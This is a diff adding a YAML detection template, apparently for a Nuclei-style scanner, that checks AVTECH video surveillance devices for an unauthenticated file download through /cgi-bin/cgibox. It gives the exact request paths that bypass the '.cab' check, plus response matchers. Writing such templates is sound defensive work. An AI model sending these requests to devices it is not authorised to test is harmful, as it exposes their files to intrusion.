@@ -1,0 +1,33 @@
+id: avtech-unauth-file-download
+brief:
+    title: AVTECH Video Surveillance Product - Unauthenticated File Download
+    by: ritikchaddha
+    level: high
+    about: AVTECH video surveillance products unauthenticated file download from web root through /cgi-bin/cgibox, Since the .cab string is verified by the strstr method, the file download can be realized by ...
+    label:
+        - exposure
+        - avtech
+        - unauth
+        - download
+        - iot
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/cgi-bin/cgibox?.cab'
+        - '{{BaseURL}}/cgi-bin/cgibox?/nobody'
+      signs:
+        - "on": word
+          has:
+            - ELF
+            - ddns_avtech_final
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/plain
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
